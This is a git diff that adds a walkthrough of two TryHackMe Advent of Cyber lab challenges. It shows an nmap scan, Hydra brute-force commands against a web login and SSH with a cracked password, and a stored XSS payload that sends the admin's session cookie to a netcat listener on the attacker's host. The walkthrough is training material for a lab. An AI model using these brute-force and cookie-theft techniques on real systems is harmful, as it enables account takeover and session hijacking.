@@ -730,9 +730,46 @@ for file in files: # get file name one by one
 You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!
 ```
 READ [this](https://blog.tryhackme.com/hydra/)
+
+```console
+kali@kali:~$ nmap -p- -A 10.10.14.193                                                              
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 22:11 EDT                                    
+Nmap scan report for 10.10.14.193                                                                  
+Host is up (0.059s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:9a:04:86:5b:8c:91:ec:c7:a2:1c:98:91:ad:29:8b (RSA)
+|   256 7b:05:37:61:84:83:ad:ab:2e:fc:98:ad:96:a2:36:66 (ECDSA)
+|_  256 84:ec:f1:4a:ba:ab:b1:8b:ed:1a:31:58:f0:82:67:0e (ED25519)
+80/tcp open  http    Node.js Express framework
+| http-title: Christmas Challenge
+|_Requested resource was /login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
 ## Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
+```console
+kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
+```
 
 ## Use Hydra to bruteforce molly's SSH password. What is flag 2?
+```console
+kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.14.193 -t 4 ssh
+Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-14 22:18:51
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.14.193:22/
+[22][ssh] host: 10.10.14.193   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-14 22:19:50
+kali@kali:~$ ssh molly@10.10.14.193
+molly@ip-10-10-14-193:~$ ls
+flag2.txt
+molly@ip-10-10-14-193:~$ cat flag2.txt
+```
 
 # Day 18 : ELF JS 
 ```
@@ -745,8 +782,46 @@ During their OSINT, they came across a Hacker Forum. Their research has shown th
 Access the machine at http://[your-ip-address]:3000 - it may take a few minutes to deploy.
 ```
 READ [this](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#)
-## What is the admin's authid cookie value?
 
+
+## What is the admin's authid cookie value?
+start by creating a account and log in to the forum. The plan is setting up a web server to recieve incoming cookie from the forum by using netcat (I learn this from BANDIT LV 20 so go check out). To setup the server, run ```nc -lvp 20000```. -l for listen, -v for verbose, and -p for port nummber.
+
+
+Next craft the payload:
+```js
+<script>new Image().src='http://10.8.14.151:20000/cookie='+document.cookie;</script>
+```
+Then make setup the server and try to refresh the forum and see if you will recieve your cookie
+```console
+kali@kali:~$ nc -lvp 20000
+listening on [any] 20000 ...
+10.8.14.151: inverse host lookup failed: Unknown host
+connect to [10.8.14.151] from (UNKNOWN) [10.8.14.151] 48702
+GET /cookie=authid=9dd22399fb1f4fdacb008d861576680c4d34607b HTTP/1.1
+Host: 10.8.14.151:20000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.165.251:3000/home
+Connection: keep-alive
+```
+Yep it is working! so let run the server again and wait for admin to login!!
+```console
+kali@kali:~$ nc -lvp 20000
+listening on [any] 20000 ...
+10.10.165.251: inverse host lookup failed: Unknown host
+connect to [10.8.14.151] from (UNKNOWN) [10.10.165.251] 37236
+GET /cookie=authid=2564799XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1
+Host: 10.8.14.151:20000
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
+Accept: image/webp,image/apng,image/*,*/*;q=0.8
+Referer: http://localhost:3000/admin
+Accept-Encoding: gzip, deflate
+```
+GLHF
 # Day 19 : Commands
 ```
 Another day, another hack from the Christmas Monster. Can you get back control of the system?
